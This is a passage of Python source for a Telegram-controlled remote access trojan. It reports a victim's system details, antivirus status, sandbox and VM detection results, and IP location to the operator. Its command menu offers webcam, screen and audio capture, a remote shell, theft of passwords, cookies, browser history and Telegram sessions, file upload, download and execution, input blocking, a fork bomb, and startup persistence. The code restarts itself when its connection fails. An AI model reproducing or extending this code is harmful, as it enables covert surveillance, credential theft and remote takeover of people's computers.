   '\n*Computer Name* » `'+Manufacturer+'`'+
   '\n*Computer Model* » `'+Model+'`'+
   '\n*User Name* » `'+os.getlogin()+'`'+
   '\n*System Time* » `'+SystemTime()+'`'+
   '\n'
   '\n'
   '\n*Protection*'
   '\n'
   '\n*Started as Admin* » `'+str(Admin())+'`'+
   '\n*Process Protected* » `'+str(ProcessBSODProtectionEnabled)+'`'+
   '\n*Installed Antivirus* » `'+av+'`'+
   '\n'
   '\n'
   '\n*Virtualizaion*'
   '\n'
   '\n*Emulator* » `'+str(Emulator())+'`'+
   '\n*Debugger* » `'+str(Debugger())+'`'+
   '\n*Sandboxie* » `'+str(SandBox())+'`'+
   '\n*VirtualBox* » `'+str(VirtualBox())+'`'+
   '\n*Organization* » `'+str(Organization() or OrganizationPaths())+'`'+
   '\n'
   '\n'
   '\n*Hardware*'
   '\n'
   '\n*CPU* » `'+str(CPU)+'`'+
   '\n*GPU* » `'+str(GPU)+'`'+
   '\n*RAM* » `'+str(RAM)+'`'+
   '\n*ARM* » `'+str(ARM)+'`'+
   '\n'
   '\n'
   '\n*Location*'
   '\n'
   '\n*IP Address* » `'+Location('query')+'`'+
   '\n*Country* » `'+Location('country')+'`'+
   '\n*City* » `'+Location('city')+'`',
   parse_mode='Markdown')
 except:
  pass


# Command handler / help

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
 bot.send_message(command.chat.id,
  'ᅠᅠᅠᅠ ⚙️ *Commands* ⚙️'
  '\n'
  '\n'
  '\n*/Info* - System Information'
  '\n*/Screen* -  Desktop Capture'
  '\n*/Webcam* - Webcam Capture'
  '\n*/Video* - Webcam Video Capture'
  '\n*/Audio* - Sound Capture'
  '\n*/Power* - Computer Power'
  '\n*/Autorun* - Startup Management'
  '\n'
  '\n*/Files* - Files Manager'
  '\n› */CD* - Change Directory'
  '\n› */ls* - List of Files'
  '\n› */Remove* - Remove a File'
  '\n› */Upload* - Upload File'
  '\n› */Download* - Download File'
  '\n› */Run* - Run File'
  '\n*/Tasklist* - Process list'
  '\n*/Taskkill* - Process Kill'
  '\n'
  '\n*/Message* - Send Message'
  '\n*/Speak* - Speak Message'
  '\n*/OpenURL* - Open URL'
  '\n*/Wallpapers* - Set Wallpapers'
  '\n*/ForkBomb* - Launch Programs'
  '\n'
  '\n*/Telegram* - Telegram Session'
  '\n*/Passwords* - Get Passwords'
  '\n*/Cookies* - Get Cookies'
  '\n*/History* - Get History'
  '\n'
  '\n*/Clipboard* - Clipboard Editing'
  '\n*/Monitor* - Monitor Control'
  '\n*/Rotate* - Display Rotate'
  '\n*/Freeze* - Block Input'
  '\n*/CMD* - Remote Shell'
  '\n'
  '\n'
  '\n*Coded by Bainky | @bainki 👾*', 
  reply_markup=menu, parse_mode='Markdown')


# Navigation buttons

@bot.message_handler(commands=['3', '6'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode='Markdown')

@bot.message_handler(commands=['2', '5'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['4', '1'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode='Markdown')

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
 bot.send_message(command.chat.id, '*Select an Action*', reply_markup=main2, parse_mode='Markdown')

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
 bot.send_message(command.chat.id, '*Select an Action*', reply_markup=main3, parse_mode='Markdown')

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode='Markdown')

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode='Markdown')

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
 bot.send_message(command.chat.id, '*Send Photo*', parse_mode='Markdown')


try:
 bot.polling(Argument)
except:
 os.startfile(CurrentPath)
 sys.exit()